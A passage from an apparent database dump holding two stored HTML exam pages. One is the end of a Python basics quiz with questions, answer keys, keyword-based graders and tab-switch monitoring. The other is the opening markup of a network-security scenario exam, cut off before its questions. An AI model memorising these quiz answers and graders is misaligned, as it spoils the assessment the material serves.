= 55."};\n    return{s:0,fb:"range(1,11) is 1 to 10. Sum 1+2+...+10 = 55."};\n  }\n},\n\n/* 23 */ {\n  cat:"For Loop", type:"write",\n  q:"Write a for loop that uses range() to print all even numbers from 2 to 10 inclusive.",\n  ph:"for ...:\\n    print(...)", ml:true,\n  ans:"for i in range(2, 11, 2):\\n    print(i)",\n  grade(a){\n    const c=a.trim().toLowerCase().replace(/\\s+/g," ");\n    const hasFor=c.includes("for")&&c.includes("in range");\n    const hasPrint=c.includes("print");\n    const hasStep=c.includes(",2)")||c.includes(", 2)");\n    const hasRange=c.includes("range(2,11")||c.includes("range(2, 11")||c.includes("range(2,12")||c.includes("range(2, 12");\n    if(hasFor&&hasPrint&&hasStep&&hasRange) return{s:1,fb:"Correct. range(2,11,2) → 2,4,6,8,10."};\n    if(hasFor&&hasPrint&&(hasStep||hasRange)) return{s:.5,fb:"Partial. Use range(2, 11, 2) to get 2,4,6,8,10."};\n    return{s:0,fb:"Answer:\\nfor i in range(2, 11, 2):\\n    print(i)"};\n  }\n},\n\n/* 24 */ {\n  cat:"For Loop", type:"output",\n  q:"What does this code print?",\n  code:`result = 1\\nfor i in range(1, 5):\\n    result *= i\\nprint(result)`,\n  ph:"Single number", ml:false, ans:"24",\n  grade(a){\n    if(a.trim()==="24") return{s:1,fb:"Correct. 1*1*2*3*4=24 (factorial of 4)."};\n    return{s:0,fb:"result starts at 1, then ×1=1, ×2=2, ×3=6, ×4=24."};\n  }\n},\n\n// ── FUNCTIONS (6 questions) ───────────────────────────────────────────────────\n\n/* 25 */ {\n  cat:"Functions", type:"output",\n  q:"What does this code print?",\n  code:`def double(n):\\n    return n * 2\\n\\nprint(double(5))\\nprint(double(3) + 1)`,\n  ph:"Two lines of output", ml:true, ans:"10\\n7",\n  grade(a){\n    const ls=norm(a);\n    const ok1=ls[0]==="10", ok2=ls[1]==="7";\n    if(ok1&&ok2) return{s:1,fb:"Correct. double(5)=10. double(3)+1=6+1=7."};\n    if(ok1||ok2) return{s:.5,fb:"Partial. double(5)=10. double(3)=6, +1=7."};\n    return{s:0,fb:"double(5)=5*2=10. double(3)=3*2=6, then 6+1=7."};\n  }\n},\n\n/* 26 */ {\n  cat:"Functions", type:"write",\n  q:"Write a function called multiply(a, b) that returns the product of two numbers. Then call it and print the result of multiply(4, 6).",\n  ph:"def multiply(a, b):\\n    ...\\nprint(multiply(4, 6))", ml:true,\n  ans:"def multiply(a, b):\\n    return a * b\\nprint(multiply(4, 6))",\n  grade(a){\n    const c=a.trim().toLowerCase().replace(/\\s+/g," ");\n    const hasDef=c.includes("def multiply");\n    const hasReturn=c.includes("return")&&(c.includes("a * b")||c.includes("a*b"));\n    const hasPrint=c.includes("print(multiply(4, 6))")||c.includes("print(multiply(4,6))");\n    if(hasDef&&hasReturn&&hasPrint) return{s:1,fb:"Correct. multiply(4,6)=24."};\n    if(hasDef&&hasReturn) return{s:.5,fb:"Partial. Also call: print(multiply(4, 6))"};\n    return{s:0,fb:"Answer:\\ndef multiply(a, b):\\n    return a * b\\nprint(multiply(4, 6))  # 24"};\n  }\n},\n\n/* 27 */ {\n  cat:"Functions", type:"output",\n  q:"What does this code print?",\n  code:`def is_even(n):\\n    if n % 2 == 0:\\n        return True\\n    else:\\n        return False\\n\\nprint(is_even(6))\\nprint(is_even(9))`,\n  ph:"Two lines of output", ml:true, ans:"True\\nFalse",\n  grade(a){\n    const ls=norm(a);\n    const ok1=ls[0]==="True", ok2=ls[1]==="False";\n    if(ok1&&ok2) return{s:1,fb:"Correct. 6%2=0 → True. 9%2=1 → False."};\n    if(ok1||ok2) return{s:.5,fb:"Partial. is_even(6)=True (6%2=0), is_even(9)=False (9%2=1)."};\n    return{s:0,fb:"6%2=0 → True. 9%2=1 (not 0) → False."};\n  }\n},\n\n/* 28 */ {\n  cat:"Functions", type:"fill",\n  q:"Fill in the blank so the function returns the larger of the two numbers.",\n  code:`def bigger(a, b):\\n    if a > b:\\n        return a\\n    ________\\n        return b`,\n  ph:"The missing keyword line (with correct indentation concept)", ml:false, ans:"else:",\n  grade(a){\n    const c=a.trim().replace(/\\s/g,"");\n    if(c==="else:") return{s:1,fb:"Correct. else: covers the case when a is not greater than b."};\n    if(c.toLowerCase().includes("else")) return{s:.5,fb:"Almost. Exact: else:"};\n    return{s:0,fb:"Answer: else: (followed by ''return b'' on the next indented line)."};\n  }\n},\n\n/* 29 */ {\n  cat:"Functions", type:"write",\n  q:"Write a function called power(base, exp) that returns base raised to the power of exp. Then print power(2, 8).",\n  ph:"def power(base, exp):\\n    ...\\nprint(...)", ml:true,\n  ans:"def power(base, exp):\\n    return base ** exp\\nprint(power(2, 8))",\n  grade(a){\n    const c=a.trim().toLowerCase().replace(/\\s+/g," ");\n    const hasDef=c.includes("def power");\n    const hasReturn=c.includes("return")&&(c.includes("base ** exp")||c.includes("base**exp")||c.includes("base ** exp"));\n    const hasPrint=c.includes("print(power(2, 8))")||c.includes("print(power(2,8))");\n    if(hasDef&&hasReturn&&hasPrint) return{s:1,fb:"Correct. 2**8=256."};\n    if(hasDef&&hasReturn) return{s:.5,fb:"Partial. Also call: print(power(2, 8))"};\n    return{s:0,fb:"Answer:\\ndef power(base, exp):\\n    return base ** exp\\nprint(power(2, 8))  # 256"};\n  }\n},\n\n/* 30 */ {\n  cat:"Functions", type:"output",\n  q:"What does this code print?",\n  code:`def apply_twice(x):\\n    return x * 2 + 1\\n\\na = apply_twice(3)\\nb = apply_twice(a)\\nprint(b)`,\n  ph:"Single number", ml:false, ans:"15",\n  grade(a){\n    if(a.trim()==="15") return{s:1,fb:"Correct. apply_twice(3)=3*2+1=7. apply_twice(7)=7*2+1=15."};\n    return{s:0,fb:"apply_twice(3)=3*2+1=7. Then a=7. apply_twice(7)=7*2+1=15."};\n  }\n}\n\n]; // end QS\n\n// ─── HELPERS ─────────────────────────────────────────────────────────────────\nfunction norm(a){ return a.trim().replace(/\\r/g,"").split("\\n").map(s=>s.trim()); }\nfunction esc(s=""){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }\nfunction hl(code){\n  return esc(code)\n    .replace(/\\b(def|if|elif|else|for|while|in|return|and|or|not|True|False|None|print)\\b/g,''<span class="kw">$1</span>'')\n    .replace(/\\b(range|int|float|input|type|abs)\\b/g,''<span class="bi">$1</span>'')\n    .replace(/\\b([a-z_][a-z_0-9]*)(?=\\()/g,''<span class="fn">$1</span>'')\n    .replace(/(f?"[^"]*"|f?''[^'']*'')/g,''<span class="st">$1</span>'')\n    .replace(/\\b(\\d+\\.?\\d*)\\b/g,''<span class="nm">$1</span>'')\n    .replace(/(#.*)/g,''<span class="cm">$1</span>'');\n}\n\n// ─── STATE ────────────────────────────────────────────────────────────────────\nlet curQ=0, answers=new Array(30).fill(null), grades=new Array(30).fill(null);\nlet timerInt=null, secsLeft=45*60, tabVio=0, live=false;\n\n// ─── START ────────────────────────────────────────────────────────────────────\nfunction startExam(){\n  document.getElementById("welcome").style.display="none";\n  document.getElementById("exam").style.display="block";\n  live=true;\n  timerInt=setInterval(()=>{\n    secsLeft--;\n    const m=Math.floor(secsLeft/60), s=secsLeft%60;\n    const el=document.getElementById("timer");\n    el.textContent=`${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;\n    el.className="timer"+(secsLeft<120?" warn":"");\n    if(secsLeft<=0){ clearInterval(timerInt); submitExam(); }\n  },1000);\n  renderQ();\n}\n\n// ─── RENDER ───────────────────────────────────────────────────────────────────\nfunction renderQ(){\n  const q=QS[curQ];\n  document.getElementById("plbl").textContent=`Q ${curQ+1} / 30`;\n  document.getElementById("pfill").style.width=((curQ+1)/30*100)+"%";\n  const tl={output:"Predict Output", write:"Write Code", fill:"Fill in Blank"};\n  const tc={output:"t-out", write:"t-wri", fill:"t-fil"};\n  const cH=q.code?`<div class="code">${hl(q.code)}</div>`:"";\n  const cv=answers[curQ]!==null?esc(answers[curQ]):"";\n  document.getElementById("qbox").innerHTML=`\n    <div class="qcard">\n      <div class="qmeta">\n        <span class="qnum">Question ${curQ+1} of 30 <span class="qtype ${tc[q.type]}">${tl[q.type]}</span></span>\n        <span class="qcat">${q.cat}</span>\n      </div>\n      <div class="qtxt">${esc(q.q)}</div>\n      ${cH}\n      <label class="albl">Your Answer</label>\n      ${q.ml\n        ?`<textarea class="ainp ml" id="ai" placeholder="${esc(q.ph)}" oninput="onIn()">${cv}</textarea>`\n        :`<input type="text" class="ainp" id="ai" placeholder="${esc(q.ph)}" value="${cv}" oninput="onIn()" onkeydown="onKey(event)">`\n      }\n      <p class="ahint">${q.ml?"Type your answer above.":"Press Enter to advance."}</p>\n    </div>`;\n  setTimeout(()=>{ const i=document.getElementById("ai"); if(i) i.focus(); },40);\n  const nb=document.getElementById("nxtBtn");\n  nb.textContent=curQ===29?"Submit Exam ✓":"Next →";\n  nb.disabled=!answers[curQ]||answers[curQ].trim()==="";\n}\n\nfunction onIn(){ const v=document.getElementById("ai").value; answers[curQ]=v; document.getElementById("nxtBtn").disabled=v.trim()===""; }\nfunction onKey(e){ if(e.key==="Enter"){ e.preventDefault(); if(answers[curQ]?.trim()) nextQ(); } }\n\n// ─── NEXT ─────────────────────────────────────────────────────────────────────\nfunction nextQ(){\n  const i=document.getElementById("ai"); if(i) answers[curQ]=i.value;\n  const q=QS[curQ], a=(answers[curQ]||"").trim();\n  grades[curQ]=a===""?{s:0,fb:"Not answered."}:q.grade(a);\n  if(curQ<29){ curQ++; renderQ(); } else { submitExam(); }\n}\n\n// ─── SUBMIT ───────────────────────────────────────────────────────────────────\nfunction submitExam(){\n  clearInterval(timerInt); live=false;\n  QS.forEach((q,i)=>{ if(!grades[i]){ const a=(answers[i]||"").trim(); grades[i]=a===""?{s:0,fb:"Not answered."}:q.grade(a); } });\n  document.getElementById("exam").style.display="none";\n  showResults();\n}\n\n// ─── RESULTS ──────────────────────────────────────────────────────────────────\nfunction showResults(){\n  let total=0, full=0, part=0, wrong=0;\n  grades.forEach(g=>{ total+=g.s; if(g.s===1) full++; else if(g.s>0) part++; else wrong++; });\n  const pct=Math.round((total/30)*100);\n  const gr=pct>=90?"A+":pct>=80?"A":pct>=70?"B":pct>=60?"C":pct>=50?"D":"F";\n  const el=45*60-secsLeft, em=Math.floor(el/60), es=el%60;\n\n  const rev=QS.map((q,i)=>{\n    const g=grades[i];\n    const cls=g.s===1?"cor":g.s>0?"par":"wrg";\n    const bc=g.s===1?"bc":g.s>0?"bp":"bw";\n    const bt=g.s===1?"✓ Correct":g.s>0?"½ Partial":"✗ Incorrect";\n    const cH=q.code?`<div class="rcode">${hl(q.code)}</div>`:"";\n    const ya=(answers[i]||"").trim()||"(no answer)";\n    return `<div class="rcard ${cls}">\n      <div class="rh2"><span class="rqn">Q${i+1} · ${q.cat}</span><span class="rbadge ${bc}">${bt}</span></div>\n      <div class="rq">${esc(q.q)}</div>${cH}\n      <div class="rans ry">Your answer: ${esc(ya)}</div>\n      ${g.s<1?`<div class="rans rc2">Correct answer: ${esc(q.ans)}</div>`:""}\n      <div class="rexpl">💡 ${esc(g.fb)}</div>\n    </div>`;\n  }).join("");\n\n  const rs=document.getElementById("res");\n  rs.style.display="block";\n  rs.innerHTML=`\n    <div class="rh">\n      <div class="stamp" style="margin-bottom:18px">Exam Results</div>\n      <div class="sring"><span class="sn">${pct}%</span><span class="sg">Grade ${gr}</span></div>\n      <p style="font-family:''IBM Plex Mono'',monospace;font-size:11px;color:var(--muted);margin-top:14px">\n        Score: ${total} / 30 &nbsp;·&nbsp; Time: ${String(em).padStart(2,"0")}:${String(es).padStart(2,"0")} &nbsp;·&nbsp; Tab alerts: ${tabVio}\n      </p>\n    </div>\n    <div class="srow">\n      <div class="sb"><span class="sn2 c">${full}</span><span class="slbl">Correct</span></div>\n      <div class="sb"><span class="sn2 p">${part}</span><span class="slbl">Partial</span></div>\n      <div class="sb"><span class="sn2 w">${wrong}</span><span class="slbl">Incorrect</span></div>\n    </div>\n    <div><div class="rtitle">Answer Review</div>${rev}</div>\n    <div style="text-align:center;margin-top:32px">\n      <button class="btn btn-s" onclick="location.reload()">↺ Retake Exam</button>\n    </div>`;\n}\n\n// ─── TAB DETECTION ────────────────────────────────────────────────────────────\ndocument.addEventListener("visibilitychange",()=>{\n  if(!live||!document.hidden) return;\n  tabVio++;\n  const o=document.getElementById("tover"), m=document.getElementById("tmsg");\n  o.classList.add("show");\n  if(tabVio>=3){ m.textContent="3 violations — auto-submitting."; setTimeout(()=>{ o.classList.remove("show"); submitExam(); },1600); }\n  else{ m.textContent=`Warning ${tabVio} / 3 — return to continue.`; }\n});\nfunction dismissTab(){ document.getElementById("tover").classList.remove("show"); }\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 12, 'Published', 1, '2026-03-05 06:49:51', '2026-03-09 13:59:42', NULL, NULL),
(11, 8, NULL, 'Cybersec Scenario Exam 1', '', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Network Security — Scenario Exam</title>\n<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,600;1,400&family=Syne:wght@700;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet">\n<style>\n:root {\n  --ink: #0d0f12;\n  --paper: #f5f1ea;\n  --card: #faf8f4;\n  --border: #d8d2c8;\n  --accent: #c0392b;\n  --accent2: #1a5276;\n  --green: #1e8449;\n  --amber: #d68910;\n  --mono: ''IBM Plex Mono'', monospace;\n  --sans: ''DM Sans'', sans-serif;\n  --display: ''Syne'', sans-serif;\n}\n* { margin:0; padding:0; box-sizing:border-box; }\nbody {\n  background: var(--paper);\n  color: var(--ink);\n  font-family: var(--sans);\n  min-height: 100vh;\n  background-image:\n    radial-gradient(circle at 20% 20%, rgba(192,57,43,0.04) 0%, transparent 50%),\n    radial-gradient(circle at 80% 80%, rgba(26,82,118,0.04) 0%, transparent 50%);\n}\n#app { max-width: 780px; margin: 0 auto; padding: 24px 20px 60px; }\n\n/* ── TAB WARNING OVERLAY ── */\n#tab-overlay {\n  display: none;\n  position: fixed;\n  inset: 0;\n  background: rgba(10,5,5,0.97);\n  z-index: 9999;\n  align-items: center;\n  justify-content: center;\n  flex-direction: column;\n  text-align: center;\n  padding: 40px;\n}\n#tab-overlay.show { display: flex; }\n.tab-warn-icon { font-size: 64px; margin-bottom: 20px; }\n.tab-warn-title {\n  font-family: var(--display);\n  font-size: clamp(22px, 4vw, 36px);\n  font-weight: 800;\n  color: #ff4d4d;\n  margin-bottom: 12px;\n}\n.tab-warn-sub {\n  font-family: var(--mono);\n  font-size: 13px;\n  color: #888;\n  margin-bottom: 6px;\n  letter-spacing: 1px;\n}\n.tab-warn-count {\n  font-family: var(--mono);\n  font-size: 12px;\n  color: #ff4d4d;\n  margin-bottom: 30px;\n  letter-spacing: 2px;\n}\n.tab-warn-btn {\n  background: #ff4d4d;\n  color: #fff;\n  border: none;\n  font-family: var(--display);\n  font-size: 13px;\n  font-weight: 700;\n  letter-spacing: 2px;\n  padding: 14px 36px;\n  cursor: pointer;\n  border-radius: 3px;\n  text-transform: uppercase;\n  transition: background 0.2s;\n}\n.tab-warn-btn:hover { background: #c0392b; }\n.tab-warn-dismiss {\n  font-family: var(--mono);\n  font-size: 10px;\n  color: #555;\n  margin-top: 14px;\n  letter-spacing: 1px;\n}\n\n/* ── INTRO ── */\n#intro { padding: 60px 0 40px; animation: rise 0.6s ease both; }\n.stamp {\n  display: inline-block;\n  border: 2px solid var(--accent);\n  color: var(--accent);\n  font-family: var(--mono);\n  font-size: 10px;\n  letter-spacing: 4px;\n  padding: 5px 14px;\n  text-transform: uppercase;\n  margin-bottom: 28px;\n  transform: rotate(-1deg);\n}\n.intro-h1 {\n  font-family: var(--display);\n  font-size: clamp(32px, 6vw, 54px);\n  font-weight: 800;\n  line-height: 1.05;\n  margin-bottom: 10px;\n}\n.intro-h1 em { color: var(--accent); font-style: normal; }\n.intro-sub {\n  font-family: var(--mono);\n  font-size: 12px;\n  color: #888;\n  letter-spacing: 1px;\n  margin-bottom: 36px;\n}\n.meta-strip {\n  display: flex;\n  border: 1px solid var(--border);\n  border-radius: 6px;\n  overflow: hidden;\n  background: var(--card);\n  margin-bottom: 30px;\n}\n.meta-cell {\n  flex: 1;\n  padding: 18px 10px;\n  border-right: 1px solid var(--border);\n  text-align: center;\n}\n.meta-cell:last-child { border-right: none; }\n.meta-val { font-family: var(--display); font-size: 24px; font-weight: 800; color: var(--accent2); display: block; }\n.meta-lbl { font-family: var(--mono); font-size: 9px; color: #999; letter-spacing: 2px; text-transform: uppercase; margin-top: 3px; display: block; }\n\n.rules-box {\n  background: var(--card);\n  border: 1px solid var(--border);\n  border-left: 3px solid var(--accent2);\n  border-radius: 4px;\n  padding: 20px 22px;\n  margin-bottom: 30px;\n}\n.rules-head { font-family: var(--mono); font-size: 10px; letter-spacing: 3px; color: var(--accent2); text-transform: uppercase; margin-bottom: 14px; }\n.rule-line { font-size: 14px; color: #555; margin-bottom: 8px; padding-left: 18px; position: relative; line-height: 1.5; }\n.rule-line::before { content: ''→''; position: absolute; left: 0; color: var(--accent); font-family: var(--mono); font-size: 12px; }\n.rule-line strong { color: var(--ink); }\n\n.btn-start {\n  background: var(--ink);\n  color: var(--paper);\n  border: none;\n  font-family: var(--display);\n  font-size: 14px;\n  font-weight: 700;\n  letter-spacing: 3px;\n  text-transform: uppercase;\n  padding: 16px 44px;\n  cursor: pointer;\n  border-radius: 3px;\n  transition: background 0.2s;\n}\n.btn-start:hover { background: var(--accent); }\n\n/* ── EXAM ── */\n#exam { display:none; animation: rise 0.4s ease both; }\n.exam-topbar {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  margin-bottom: 18px;\n  padding-bottom: 14px;\n  border-bottom: 1px solid var(--border);\n  flex-wrap: wrap;\n  gap: 10px;\n}\n.qcount { font-family: var(--mono); font-size: 12px; color: #888; }\n.qcount strong { color: var(--ink); font-size: 18px; }\n.topbar-right { display: flex; align-items: center; gap: 10px; }\n.attempt-badge {\n  font-family: var(--mono);\n  font-size: 11px;\n  padding: 5px 12px;\n  border-radius: 20px;\n  border: 1.5px solid var(--amber);\n  color: var(--amber);\n  letter-spacing: 1px;\n}\n.tab-counter {\n  font-family: var(--mono);\n  font-size: 11px;\n  padding: 5px 12px;\n  border-radius: 20px;\n  background: rgba(192,57,43,0.08);\n  border: 1.5px solid rgba(192,57,43,0.3);\n  color: var(--accent);\n  letter-spacing: 1px;\n}\n\n.prog-bar-bg { height: 3px; background: var(--border); border-radius: 2px; margin-bottom: 24px; overflow: hidden; }\n.prog-bar-fg { height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent2)); border-radius: 2px; transition: width 0.5s cubic-bezier(0.4,0,0.2,1); }\n\n.scenario-box {\n  background: #fff8f0;\n  border: 1px solid #e8ddd0;\n  border-left: 4px solid var(--amber);\n  border-radius: 4px;\n  padding: 22px 24px;\n  margin-bottom: 18px;\n}\n.sc-tag { font-family: var(--mono); font-size: 9px; letter-spacing: 3px; color: var(--amber); text-transform: uppercase; margin-bottom: 10px; }\n.sc-body { font-size: 15px; line-height: 1.75; color: #3a3020; }\n.sc-body mark { background: rgba(192,57,43,0.1); color: var(--accent); padding: 1px 4px; border-radius: 2px; font-weight: 500; }\n.sc-body code { font-family: var(--mono); font-size: 13px; background: rgba(0,0,0,0.06); padding: 1px 5px; border-radius: 2px; color: var(--accent2); }\n\n.q-box { background: var(--card); border: 1px solid var(--border); border-radius: 4px; padding: 20px 22px; margin-bottom: 18px; }\n.q-tag { font-family: var(--mono); font-size: 9px; letter-spacing: 3px; color: var(--accent2); text-transform: uppercase; margin-bottom: 10px; }\n.q-text { font-family: var(--display); font-size: 18px; font-weight: 700; line-height: 1.4; }\n\n.ans-label { font-family: var(--mono); font-size: 10px; letter-spacing: 2px; color: #999; text-transform: uppercase; margin-bottom: 8px; display: block; }\ntextarea {\n  width: 100%;\n  min-height: 130px;\n  background: #fff;\n  border: 1px solid var(--border);\n  border-radius: 4px;\n  padding: 14px 16px;\n  font-family: var(--sans);\n  font-size: 15px;\n  color: var(--ink);\n  resize: vertical;\n  outline: none;\n  transition: border-color 0.2s;\n  line-height: 1.6;\n}\ntextarea:focus { border-color: var(--accent2); }\ntextarea::placeholder { color: #bbb; font-style: italic; }\n\n.btn-submit {\n  background: var(--accent2);\n  color: #fff;\n  border: none;\n  font-family: var(--mono);\n  font-size: 12px;\n  font-weight: 600;\n  letter-spacing: 2px;\n  text-transform: uppercase;\n  padding: 13px 32px;\n  cursor: pointer;\n  border-radius: 3px;\n  transition: background 0.2s;\n  float: right;\n}\n.btn-submit:hover:not(:disabled) { background: var(--ink); }\n.btn-submit:disabled { background: #ccc; cursor: not-allowed; }\n.clearfix::after { content:''''; display:table; clear:both; }\n\n/* ── END SCREEN (after exam, before decision) ── */\n#end-screen { display:none; animation: rise 0.5s ease both; }\n.end-wrap {\n  text-align: center;\n  padding: 60px 20px;\n  background: var(--card);\n  border: 1px solid var(--border);\n  border-radius: 8px;\n  margin-top: 40px;\n}\n.end-icon { font-size: 56px; margin-bottom: 16px; }\n.end-title { font-family: var(--display); font-size: clamp(24px, 4vw, 38px); font-weight: 800; margin-bottom: 10px; }\n.end-sub { font-family: var(--mono); font-size: 13px; color: #888; margin-bottom: 8px; letter-spacing: 1px; }\n.end-score {\n  display: inline-block;\n  font-family: var(--display);\n  font-size: 48px;\n  font-weight: 800;\n  color: var(--accent2);\n  border: 3px solid var(--accent2);\n  border-radius: 50%;\n  width: 130px;\n  height: 130px;\n  line-height: 124px;\n  margin: 20px 0 10px;\n}\n.end-attempts-left { font-family: var(--mono); font-size: 12px; color: var(--amber); letter-spacing: 2px; margin: 14px 0 28px; }\n.end-btns { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; }\n.btn-retake {\n  background: var(--accent2);\n  color: #fff;\n  border: none;\n  font-family: var(--display);\n  font-size: 13px;\n  font-weight: 700;\n  letter-spacing: 2px;\n  padding: 14px 32px;\n  cursor: pointer;\n  border-radius: 3px;\n  text-transform: uppercase;\n  transition: background 0.2s;\n}\n.btn-retake:hover { background: var(--ink); }\n.btn-see-answers {\n  background: transparent;\n  color: var(--ink);\n  border: 2px solid var(--ink);\n  font-family: var(--display);\n  font-size: 13px;\n  font-weight: 700;\n  letter-spacing: 2px;\n  padding: 14px 32px;\n  cursor: pointer;\n  border-radius: 3px;\n  text-transform: uppercase;\n  transition: all 0.2s;\n}\n.btn-see-answers:hover { background: var(--ink); color: var(--paper); }\n.end-note { font-size: 13px; color: #aaa; margin-top: 20px; font-style: italic; }\n\n/* ── RESULTS ── */\n#results { display:none; animation: rise 0.5s ease both; }\n.results-banner { text-align: center; padding: 50px 0 36px; border-bottom: 1px solid var(--border); margin-bottom: 40px; }\n.rb-tag { font-family: var(--mono); font-size: 10px; letter-spacing: 4px; color: #999; text-transform: uppercase; margin-bottom: 16px; }\n.rb-h1 { font-family: var(--display); font-size: clamp(26px, 4vw, 42px); font-weight: 800; margin-bottom: 24px; }\n.score-ring {\n  display: inline-flex; flex-direction: column; align-items: center; justify-content: center;\n  width: 150px; height: 150px; border-radius: 50%; border: 3px solid var(--ink); margin-bottom: 14px;\n}\n.ring-num { font-family: var(--display); font-size: 46px; font-weight: 800; line-height: 1; }\n.ring-denom { font-family: var(--mono); font-size: 12px; color: #888; margin-top: 2px; }\n.grade-badge { display: inline-block; font-family: var(--mono); font-size: 11px; letter-spacing: 2px; padding: 6px 18px; border-radius: 20px; border: 1.5px solid; margin-top: 10px; }\n\n.attempt-history {\n  background: var(--card);\n  border: 1px solid var(--border);\n  border-radius: 6px;\n  padding: 20px 22px;\n  margin-bottom: 36px;\n}\n.ah-title { font-family: var(--mono); font-size: 10px; letter-spacing: 3px; color: #999; text-transform: uppercase; margin-bottom: 14px; }\n.ah-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--border); }\n.ah-row:last-child { border-bottom: none; }\n.ah-lbl { font-family: var(--mono); font-size: 13px; color: #555; }\n.ah-score { font-family: var(--display); font-size: 18px; font-weight: 800; }\n\n.review-header { font-family: var(--mono); font-size: 10px; letter-spacing: 3px; color: #888; text-transform: uppercase; padding-bottom: 12px; border-bottom: 1px solid var(--border); margin-bottom: 24px; }\n.rev-item { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin-bottom: 20px; }\n.rev-head { display: flex; align-items: center; gap: 12px; padding: 12px 18px; border-bottom: 1px solid var(--border); flex-wrap: wrap; }\n.rev-num { font-family: var(--mono); font-size: 11px; color: #999; flex-shrink: 0; }\n.rev-status { font-family: var(--mono); font-size: 10px; letter-spacing: 2px; padding: 3px 10px; border-radius: 20px; flex-shrink: 0; }\n.rev-status.correct { background: rgba(30,132,73,0.12); color: var(--green); border: 1px solid rgba(30,132,73,0.3); }\n.rev-status.partial { background: rgba(214,137,16,0.12); color: var(--amber); border: 1px solid rgba(214,137,16,0.3); }\n.rev-status.incorrect { background: rgba(192,57,43,0.1); color: var(--accent); border: 1px solid rgba(192,57,43,0.2); }\n.rev-scenario-mini { font-size: 12px; color: #aaa; font-style: italic; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n.rev-body { padding: 16px 18px; background: var(--card); }\n.rev-q { font-family: var(--display); font-size: 15px; font-weight: 700; color: var(--ink); margin-bottom: 14px; line-height: 1.4; }\n.rev-section { margin-bottom: 14px; }\n.rev-section-label { font-family: var(--mono); font-size: 9px; letter-spacing: 2px; text-transform: uppercase; color: #aaa; margin-bottom: 6px; }\n.rev-user-ans { background: #fff; border: 1px solid var(--border); border-radius: 3px; padding: 10px 14px; font-size: 14px; color: #444; line-height: 1.6; font-style: italic; }\n.rev-model-ans { background: rgba(30,132,73,0.06); border: 1px solid rgba(30,132,73,0.2); border-radius: 3px; padding: 10px 14px; font-size: 14px; color: #1a4a2e; line-height: 1.6; }\n.rev-kws { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 6px; }\n.kw-tag { font-family: var(--mono); font-size: 11px; padding: 3px 10px; border-radius: 20px; background: rgba(26,82,118,0.08); color: var(--accent2); border: 1px solid rgba(26,82,118,0.15); }\n.kw-tag.matched { background: rgba(30,132,73,0.1); color: var(--green); border-color: rgba(30,132,73,0.2); }\n.kw-tag.missed { background: rgba(192,57,43,0.08); color: var(--accent); border-color: rgba(192,57,43,0.15); text-decoration: line-through; opacity: 0.7; }\n\n.btn-restart { display: block; margin: 44px auto 0; background: transparent; border: 2px solid var(--ink); color: var(--ink); font-family: var(--display); font-size: 13px; font-weight: 700; letter-spacing: 3px; text-transform: uppercase; padding: 14px 40px; cursor: pointer; border-radius: 3px; transition: all 0.2s; }\n.btn-restart:hover { background: var(--ink); color: var(--paper); }\n\n@keyframes rise { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }\n@keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }\n.shake { animation: shake 0.4s ease; }\n</style>\n</head>\n<body>\n\n<!-- TAB SWITCH WARNING OVERLAY -->\n<div id="tab-overlay">\n  <div class="tab-warn-icon">⚠️</div>\n  <div class="tab-warn-title">Tab Switch Detected</div>\n  <div class="tab-warn-sub">You navigated away from this exam.</div>\n  <div class="tab-warn-sub">This incident has been logged.</div>\n  <div class="tab-warn-count" id="tab-warn-count">Violations: 1 / 3 — Next violation may terminate your exam.</div>\n  <button class="tab-warn-btn" onclick="dismissTabWarning()">Return to Exam</button>\n  <div class="tab-warn-dismiss">Switching tabs again will count as another violation.</div>\n</div>\n\n<div id="app">\n\n<!-- ── INTRO ── -->\n<div id="intro">\n  <div class="stamp">◈ CyberSec Academy</div>\n  <h1 class="intro-h1">Network Security<br><em>Fundamentals</em></h1>\n  <p class="intro-sub">SCENARIO-BASED WRITTEN EXAM · UNIT 01 · 20 QUESTIONS</p>\n  <div class="meta-strip">\n    <div class="meta-cell"><span class="meta-val">20</span><span class="meta-lbl">Scenarios</span></div>\n    <div class="meta-cell"><span class="meta-val">Written</span><span class="meta-lbl">Format</span></div>\n    <div class="meta-cell"><span class="meta-val">3</span><span class="meta-lbl">Retakes</span></div>\n    <div class="meta-cell"><span class="meta-val">No</span><span class="meta-lbl">Hints</span></div>\n    <div class="meta-cell"><span class="meta-val">End</span><span class="meta-lbl">Review</span></div>\n  </div>\n  <div class="rules-box">\n    <div class="rules-head">// Exam Rules</div>\n    <div class="rule-line">Each question presents a real-world network security scenario — read carefully before answering.</div>\n    <div class="rule-line">Type your own written response. <strong>No multiple choice. No hints.</strong></div>\n    <div class="rule-line">No back navigation once a question is submitted.</div>\n    <div class="rule-line"><strong>You have up to 3 retakes</strong> — answers are only revealed after all retakes are used or you choose to finish.</div>\n    <div class="rule-line"><strong>Tab switching is monitored.</strong> 3 violations will terminate the exam session.</div>\n  </div>\n  <button class="btn-start" onclick="startExam()">Begin Exam →</button>\n</div>\n\n<!-- ── EXAM ── -->\n<div id="exam">\n  <div class="exam-topbar">\n    <div class="qcount"><strong id="q-num">1</strong><span> / 20</span></div>\n    <div class="topbar-right">\n      <span class="attempt-badge" id="attempt-badge">Attempt 1 of 4</span>\n      <span class="tab-counter" id="tab-counter">⚠ Violations: 0/3</span>\n    </div>\n  </div>\n  <div class="prog-bar-bg"><div class="prog-bar-fg" id="prog-fg" style="width:0%"></div></div>\n  <div id="q-area"></div>\n  <div style="margin-bottom:18px;">\n    <span class="ans-label">// Your Answer</span>\n    <textarea 